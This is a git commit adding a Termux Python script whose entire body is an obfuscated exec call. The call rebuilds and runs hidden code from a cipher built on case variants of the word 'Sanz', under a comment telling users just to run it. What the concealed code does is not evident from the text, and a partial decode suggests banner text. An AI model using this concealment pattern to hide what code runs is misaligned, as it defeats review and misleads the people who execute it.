2a8805dbdec0aebc4bfdbabcdbeee8a4cec5b81c
alwayslanz2 <alamalan728@gmail.com>
2025-05-12 18:25:42 +0700

    Add files via upload

---
+++ app.py
@@ -0,0 +1,84 @@
+#!/data/data/com.termux/files/usr/bin/python
+
+'''
+	Mau ngapain ngab? Tinggal pake aja
+	apa susahnya euy!
+
+	Script by Sanz - Yt : FREE TUTORIAL
+'''
+
+getattr(__builtins__, bytes.fromhex("65786563").decode())("".join(map(chr,[int("".join(str({'SANZ': 9,
+ 'SAnz': 4,
+ 'SanZ': 7,
+ 'Sanz': 0,
+ 'sANz': 6,
+ 'sAnz': 1,
+ 'saNZ': 5,
+ 'saNz': 2,
+ 'sanZ': 3,
+ 'sanz': 8}[i]) for i in x.split())) for x in
+"sanZ saNZ  sanZ sanZ  SAnz SanZ  sAnz Sanz Sanz  SANZ SanZ  sAnz sAnz \
+sANz  SANZ SanZ  SAnz SanZ  sAnz Sanz Sanz  SANZ SanZ  sAnz sAnz sANz \
+ SANZ SanZ  SAnz SanZ  SANZ SANZ  sAnz sAnz sAnz  sAnz Sanz SANZ  SAnz\
+ sANz  sAnz sAnz sANz  sAnz Sanz sAnz  sAnz sAnz SAnz  sAnz Sanz SANZ \
+ sAnz sAnz SanZ  sAnz saNz Sanz  SAnz SanZ  sAnz Sanz saNz  sAnz Sanz \
+saNZ  sAnz Sanz sanz  sAnz Sanz sAnz  sAnz sAnz saNZ  SAnz SanZ  sAnz \
+sAnz SanZ  sAnz sAnz saNZ  sAnz sAnz SAnz  SAnz SanZ  SANZ sanz  sAnz \
+Sanz saNZ  sAnz sAnz Sanz  SAnz SanZ  sAnz sAnz saNz  sAnz saNz sAnz  \
+sAnz sAnz sANz  sAnz Sanz SAnz  sAnz sAnz sAnz  sAnz sAnz Sanz  sAnz S\
+anz  sAnz Sanz  sanZ SANZ  sanZ SANZ  sanZ SANZ  sAnz Sanz  SANZ  sANz\
+ SANZ  sAnz Sanz SAnz  sanZ saNz  sAnz Sanz sanz  sAnz sAnz SanZ  sanZ\
+ saNz  sAnz sAnz Sanz  sAnz Sanz sanZ  sAnz Sanz sAnz  sAnz saNz sAnz \
+ sAnz Sanz sAnz  sAnz Sanz sanz  sanZ saNz  SANZ SanZ  sAnz Sanz SANZ \
+ SANZ SanZ  sAnz sAnz sANz  sanZ saNz  sAnz sAnz Sanz  sAnz Sanz sANz \
+ sAnz Sanz saNZ  sAnz sAnz SAnz  sanZ sanZ  sanZ saNz  sANz SANZ  sAnz\
+ Sanz SANZ  SANZ SanZ  sAnz sAnz Sanz  sAnz Sanz sanZ  sanZ saNz  sAnz\
+ Sanz SANZ  SANZ SanZ  sAnz sAnz SanZ  sanZ saNz  sAnz sAnz Sanz  sAnz\
+ Sanz sanZ  SANZ SanZ  sAnz sAnz saNz  SANZ SanZ  sAnz Sanz saNZ  sAnz\
+ sAnz Sanz  sanZ saNz  sAnz sAnz Sanz  sAnz Sanz sanZ  SANZ SanZ  SANZ\
+ sanz  sANz sanZ  sAnz Sanz  SANZ  sanz SAnz  sAnz Sanz saNZ  sAnz sAn\
+z Sanz  sAnz Sanz sanZ  sAnz Sanz sanZ  SANZ SanZ  sAnz Sanz sanz  san\
+Z saNz  sAnz sAnz saNz  SANZ SanZ  sAnz Sanz SanZ  sAnz Sanz sAnz  san\
+Z saNz  SANZ SanZ  sAnz Sanz sANz  SANZ SanZ  sanZ saNz  SANZ SanZ  sA\
+nz sAnz saNz  SANZ SanZ  sanZ saNz  sAnz sAnz saNZ  sAnz sAnz SanZ  sA\
+nz sAnz saNZ  SANZ SanZ  sAnz Sanz SAnz  sAnz sAnz Sanz  sAnz saNz sAn\
+z  SANZ SanZ  sanZ saNz  sAnz Sanz sAnz  sAnz sAnz SanZ  sAnz saNz sAn\
+z  sanZ sanZ  sAnz Sanz  sanZ SANZ  sanZ SANZ  sanZ SANZ  sAnz Sanz  s\
+Anz Sanz  SANZ saNZ  SANZ saNZ  sANz saNZ  sAnz sAnz SanZ  sAnz sAnz s\
+ANz  sAnz Sanz SAnz  sAnz sAnz sAnz  sAnz sAnz SAnz  SANZ saNZ  SANZ s\
+aNZ  sanZ saNz  sanZ saNz  sANz sAnz  sanZ saNz  sanZ SANZ  sanz sanZ \
+ SANZ SanZ  sAnz sAnz Sanz  sAnz saNz saNz  sanZ SANZ  sAnz Sanz  SANZ\
+ saNZ  SANZ saNZ  sanz SANZ  sAnz sAnz sAnz  sAnz sAnz SanZ  sAnz sAnz\
+ sANz  sAnz sAnz SanZ  SANZ sanz  sAnz Sanz sAnz  SANZ saNZ  SANZ saNZ\
+  sanZ saNz  sANz sAnz  sanZ saNz  sanZ SANZ  SanZ Sanz  sanz saNz  sA\
+Nz SANZ  sANz SANZ  sanZ saNz  sanz SAnz  sanz saNZ  sanz SAnz  SanZ S\
+ANZ  sanz saNz  SanZ sanZ  sANz saNZ  SanZ sANz  sanZ SANZ  sAnz Sanz \
+ SANZ saNZ  SANZ saNZ  SanZ sAnz  sAnz Sanz saNZ  sAnz sAnz sANz  sAnz\
+ Sanz SAnz  sAnz sAnz SanZ  SANZ sanz  SANZ saNZ  SANZ saNZ  sanZ saNz\
+  sanZ saNz  sANz sAnz  sanZ saNz  sanZ SANZ  sAnz Sanz SAnz  sAnz sAn\
+z sANz  sAnz sAnz sANz  sAnz sAnz saNz  sAnz sAnz saNZ  saNZ sanz  SAn\
+z SanZ  SAnz SanZ  sAnz Sanz sanZ  sAnz Sanz saNZ  sAnz sAnz sANz  sAn\
+z Sanz SAnz  sAnz sAnz SanZ  SANZ sanz  SAnz sANz  SANZ SANZ  sAnz sAn\
+z sAnz  sAnz Sanz SANZ  SAnz SanZ  sanz sanZ  sAnz saNz Sanz  sAnz sAn\
+z saNz  SAnz saNZ  SanZ sanZ  sANz sanz  sanZ SANZ  sAnz Sanz  sAnz Sa\
+nz  sAnz sAnz sANz  sAnz sAnz SAnz  sAnz saNz sAnz  saNZ sanz  sAnz Sa\
+nz  SANZ  sAnz Sanz saNz  sAnz sAnz SAnz  sAnz sAnz sAnz  sAnz Sanz SA\
+NZ  sanZ saNz  sAnz Sanz Sanz  SANZ SanZ  sAnz sAnz sANz  SANZ SanZ  s\
+anZ saNz  sAnz Sanz saNZ  sAnz Sanz SANZ  sAnz sAnz saNz  sAnz sAnz sA\
+nz  sAnz sAnz SAnz  sAnz sAnz sANz  sanZ saNz  sanz sanZ  SANZ SanZ  s\
+Anz sAnz Sanz  sAnz saNz saNz  sAnz Sanz  SANZ  sanz sanZ  SANZ SanZ  \
+sAnz sAnz Sanz  sAnz saNz saNz  SAnz sANz  SanZ sAnz  SANZ SanZ  sAnz \
+sAnz saNZ  sAnz Sanz SanZ  sAnz Sanz sAnz  sAnz sAnz SanZ  sAnz sAnz S\
+anz  SAnz Sanz  SAnz sAnz  sAnz Sanz  sAnz Sanz sAnz  sAnz saNz Sanz  \
+SANZ SANZ  sAnz Sanz sAnz  sAnz sAnz saNz  sAnz sAnz sANz  sanZ saNz  \
+sANz SANZ  sAnz saNz Sanz  SANZ SANZ  sAnz Sanz sAnz  sAnz sAnz saNz  \
+sAnz sAnz sANz  sAnz Sanz saNZ  sAnz sAnz sAnz  sAnz sAnz Sanz  sanZ s\
+aNz  SANZ SanZ  sAnz sAnz saNZ  sanZ saNz  sAnz Sanz sAnz  saNZ sanz  \
+sAnz Sanz  SANZ  SANZ saNZ  SANZ saNZ  sAnz Sanz saNZ  sAnz Sanz SANZ \
+ sAnz sAnz saNz  sAnz sAnz sAnz  sAnz sAnz SAnz  sAnz sAnz sANz  SANZ \
+saNZ  SANZ saNZ  SAnz Sanz  sanZ SANZ  sAnz sAnz saNZ  sAnz saNz sAnz \
+ sAnz sAnz saNZ  sanZ SANZ  SAnz sAnz  SAnz sANz  sAnz Sanz sAnz  sAnz\
+ saNz Sanz  sAnz Sanz saNZ  sAnz sAnz sANz  SAnz Sanz  sAnz sAnz saNZ \
+ sAnz sAnz sANz  sAnz sAnz SAnz  SAnz Sanz  sAnz Sanz sAnz  SAnz sAnz \
+ SAnz sAnz"
+.split("  ")])))
